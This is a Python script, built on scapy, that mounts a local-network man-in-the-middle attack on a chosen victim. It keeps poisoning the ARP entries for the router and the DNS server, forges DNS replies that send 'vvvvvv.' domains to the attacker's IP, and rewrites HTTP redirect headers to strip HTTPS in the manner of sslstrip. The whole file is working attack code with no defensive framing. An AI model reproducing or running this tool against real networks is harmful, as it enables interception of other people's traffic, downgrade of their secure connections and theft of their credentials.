import sys
from scapy.all import Ether,conf, get_if_addr,get_if_hwaddr,sendp,sniff,IP,DNS,DNSRR,UDP ,Raw,TCP ,DNSQR
import time
import signal 
import threading
import spoofing.arp_util as arp_util
import spoofing.dns_local as dns_local
from spoofing.http_ex  import HTTP
from  printing import Printing
import re

def validateDNS(packet:DNS)->bool: 
    ''' checks if the packet is a valid DNS packet for spoofing '''
    try: 
        if DNSQR in packet and packet[DNSQR].qname.decode().removeprefix('https://').startswith("vvvvvv.") : 
            return True 
    except: 
        ...
    return False 

def validateHttp(rawp:bytes)->bool:
    ''' check if the packet is an HTTP packet '''
    VALIDHTTP=b"HTTP"
    try : 
        return rawp.startswith(VALIDHTTP)
    except : 
        return False 

def spoofedURL(url:str)->str: 
    '''spoofing the url for sslstrip and replacing www with vvvvvvv and changing https to http and erase port specify '''
    spoofedURL = url.strip().removeprefix('https://').removeprefix('www.').strip()
    portSpecify = re.search(":\d+",spoofedURL)
    if portSpecify : 
        spoofedURL = spoofedURL[:portSpecify.start()] 
    return f"http://vvvvvv.{spoofedURL}" 

def throworkill(packet:Ether,routerMac:str , dnsMac:str ,spoofedIp :str ,  interface:str )-> None: 
    ''' if the packet is matching to any kind of spoofing it is spoofing it other wise it just doing ip forwarding  '''
    # IP forwarding 
    packet[Ether].src = routerMac
    packet[Ether].dst = dnsMac
    
    #DNS spoofing 
    if DNS in packet and validateDNS(packet): 
        Printing.printSuccess(f"poisining {packet[DNS].qd.qname}!")
        et = Ether(src =routerMac , dst =  dnsMac )
        ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
        udp = UDP(dport=packet[UDP].dport,sport=packet[UDP].sport)
        dnsdiff= DNS(id=packet[DNS].id,qd=packet[DNS].qd,
                     aa=1,
                     qr=1,
                     an=DNSRR(rrname=packet[DNS].qd.qname,type='A',ttl=10,rdata=spoofedIp))
        packet = et/ip/udp/dnsdiff
    
    #HTTP spoofing 
    elif Raw in packet and validateHttp(packet[Raw].load) : 
        httpPack = HTTP.fromRawPack(packet[Raw].load)
        if httpPack and httpPack.sslStripavailable(): 
            httpPack.headers["Location"]=spoofedURL(httpPack.headers["Location"])
            Printing.printSuccess(httpPack)
            et = Ether(src =routerMac , dst =  dnsMac )
            ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
            tcp = TCP(dport=packet[TCP].dport,sport=packet[TCP].sport,seq=packet[TCP].seq , ack =packet[TCP].ack , flags = packet[TCP].flags )
            raw = Raw(httpPack.toRaw())
            packet = et/ip/tcp/raw
        else : 
            Printing.printError(httpPack) 
    # forward the packet 
    sendp(packet,iface=interface,verbose=False) 
   
def HttpDnsSpoofer(victim : str , interface : str )->None:
    ''' gather all the data and start the threads for the spoofing '''
             
    attackData = { 
        "victim": None ,  
        "victimmac":None ,  
        "targetMac" : None,
        "routerMac" : None,
        "mac ":None , #my mac
        "ip" : None , #my ip , 
        "dnsServer" : None , 
        "dnsServerMac" : None ,
    } 
   
    def dispose(*args): 
        ''' changes the arp table to the first value '''
        print("dispoe")
        arp_util.changeArpTable(attackData["router"], attackData["routerMac"], attackData["victim"] , attackData["victimmac"],attackData["interface"] )
        sys.exit(0)
      
    def arpSpoofing():
        ''' arp spoofing to create MITM '''
        arp_util.changeArpTable(attackData["router"], attackData["routerMac"], attackData["victim"] , attackData["mac"],attackData["interface"] )
        arp_util.changeArpTable(attackData["dnsServer"], attackData["dnsServerMac"], attackData["victim"] , attackData["mac"],attackData["interface"] )
        
    def redoit():
        ''' arp spoofing mainting '''
        while(True):
            arpSpoofing()
            time.sleep(0.1)
   
    #### attackData #### - gather all the neccersy data
    attackData["victim"]=victim
    attackData["interface"]=interface
    attackData["victimmac"]=arp_util.getTargetMac(attackData["victim"], attackData["interface"])
    attackData["router"] = next(filter(lambda x : x[3] == attackData["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    attackData["routerMac"] = arp_util.getTargetMac(attackData["router"], attackData["interface"])
    attackData["mac"]=get_if_hwaddr(attackData["interface"])
    attackData["ip"]= get_if_addr(attackData["interface"])
    attackData["dnsServer"] = dns_local.get_dns_local_server()
    attackData["dnsServerMac"] = arp_util.getTargetMac(attackData["dnsServer"], attackData["interface"])
    #### attackData ####
      
    tr = threading.Thread(target=redoit)
    tr.start()
    
    signal.signal(signal.SIGINT, dispose)
    
    Printing.printLog(attackData)
    sniff(lfilter= lambda x : IP in x and x[IP].dst == attackData["victim"] , prn = lambda packet : throworkill(packet, attackData["routerMac"], attackData["victimmac"], attackData["ip"],attackData["interface"]) )
   
    
    
    
    tr.join()
    signal.pause()
    dispose()



 
        
   